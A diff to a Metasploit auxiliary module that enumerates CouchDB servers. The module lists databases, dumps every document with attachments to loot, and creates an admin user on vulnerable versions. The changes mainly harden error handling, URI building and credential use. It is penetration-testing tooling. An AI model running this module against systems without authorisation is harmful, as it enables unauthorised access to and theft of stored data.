@@ -50,7 +50,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def valid_response(res)
-    return res.code == 200 && res.headers['Server'].include?('CouchDB')
+    !res.nil? && res.code == 200 && res.headers['Server'].to_s.include?('CouchDB')
+  end
+
+  # TARGETURI identifies the list resource, not the root of the application.
+  def couchdb_uri(*components)
+    base_path = File.dirname(normalize_uri(target_uri.path).chomp('/'))
+    components.empty? ? normalize_uri(base_path, '') : normalize_uri(base_path, *components)
   end
 
   def get_version
@@ -58,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-        'uri' => '/',
+        'uri' => couchdb_uri,
         'method' => 'GET'
       )
     rescue Rex::ConnectionError
@@ -111,25 +117,30 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_dbs(auth)
-    begin
-      res = send_request_cgi(
-        'uri' => normalize_uri(target_uri.path),
-        'method' => 'GET'
-      )
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path),
+      'method' => 'GET',
+      'authorization' => auth
+    )
 
-      temp = JSON.parse(res.body)
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-      print_error("#{peer} - The following error was encountered: #{e.class}")
+    unless res
+      print_error('Failed to list databases: Target did not respond')
       return
     end
 
     unless valid_response(res)
-      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+      print_error("Failed to list databases: Unexpected HTTP status #{res.code} or server identity")
+      return
+    end
+
+    databases = res.get_json_document
+    unless databases.is_a?(Array) && databases.all? { |database| database.is_a?(String) }
+      print_error('Failed to parse database list: Unexpected JSON response')
       return
     end
 
     print_status("#{peer} - Enumerating Databases...")
-    results = JSON.pretty_generate(temp)
+    results = JSON.pretty_generate(databases)
     print_good("#{peer} - Databases:\n\n#{results}\n")
     path = store_loot(
       'couchdb.enum',
@@ -140,21 +151,31 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_good("#{peer} - File saved in: #{path}")
-    res.get_json_document.each do |db|
-      r = send_request_cgi(
-        'uri' => normalize_uri(target_uri.path, "/#{db}/_all_docs"),
+    databases.each do |db|
+      response = send_request_cgi(
+        'uri' => couchdb_uri(db, '_all_docs'),
         'method' => 'GET',
         'authorization' => auth,
         'vars_get' => { 'include_docs' => 'true', 'attachments' => 'true' }
       )
 
-      if r.code != 200
-        print_bad("#{peer} - Error retrieving database. Consider providing credentials or setting CREATEUSER and rerunning.")
+      unless response
+        print_error("Failed to retrieve database #{db}: Target did not respond")
         break
       end
 
-      temp = JSON.parse(r.body)
-      results = JSON.pretty_generate(temp)
+      unless valid_response(response)
+        print_error("Failed to retrieve database #{db}: Unexpected HTTP status #{response.code} or server identity")
+        break
+      end
+
+      documents = response.get_json_document
+      unless documents.is_a?(Hash) && documents['rows'].is_a?(Array) && documents['total_rows'].is_a?(Integer)
+        print_error("Failed to parse document response for #{db}: Unexpected JSON response")
+        break
+      end
+
+      results = JSON.pretty_generate(documents)
       path = store_loot(
         "couchdb.#{db}",
         'application/json',
@@ -164,24 +185,35 @@ class MetasploitModule < Msf::Auxiliary
       )
       print_good("#{peer} - #{db} saved in: #{path}")
     end
+  rescue ::Rex::ConnectionError => e
+    elog('CouchDB database enumeration failed', error: e)
+    print_error("Failed to enumerate databases: #{e.class}")
   end
 
-  def get_server_info(_auth)
+  def get_server_info(auth)
     res = send_request_cgi(
-      'uri' => '/',
-      'method' => 'GET'
+      'uri' => couchdb_uri,
+      'method' => 'GET',
+      'authorization' => auth
     )
 
-    temp = JSON.parse(res.body)
-
-    unless valid_response(res)
-      print_error("#{peer} - Unable to enum, received \"#{res.code}\"")
+    unless res
+      print_error('Failed to retrieve server information: Target did not respond')
       return
     end
 
-    # Example response: {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
+    unless valid_response(res)
+      print_error("Failed to retrieve server information: Unexpected HTTP status #{res.code} or server identity")
+      return
+    end
 
-    print_good("#{peer} - #{JSON.pretty_generate(temp)}")
+    server_info = res.get_json_document
+    unless server_info.is_a?(Hash) && server_info.key?('couchdb')
+      print_error('Failed to parse server information: Unexpected JSON response')
+      return
+    end
+
+    print_good("#{peer} - #{JSON.pretty_generate(server_info)}")
     report_service(
       host: rhost,
       port: rport,
@@ -189,8 +221,9 @@ class MetasploitModule < Msf::Auxiliary
       proto: 'tcp',
       info: res.body
     )
-  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
-    print_error("#{peer} - The following error was encountered: #{e.class}")
+  rescue ::Rex::ConnectionError => e
+    elog('CouchDB server information retrieval failed', error: e)
+    print_error("Failed to retrieve server information: #{e.class}")
   end
 
   def create_user
@@ -234,7 +267,10 @@ class MetasploitModule < Msf::Auxiliary
       create_user if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))
     end
 
-    auth = basic_auth(username, password) if username && password
+    # Generated defaults are reserved for CREATEUSER; ordinary enumeration
+    # stays anonymous unless the operator supplied credentials.
+    credentials_supplied = !datastore.default?('HttpUsername') || !datastore.default?('HttpPassword')
+    auth = basic_auth(username, password) if username && password && (datastore['CREATEUSER'] || credentials_supplied)
     get_server_info(auth) if datastore['SERVERINFO']
     get_dbs(auth)
   end
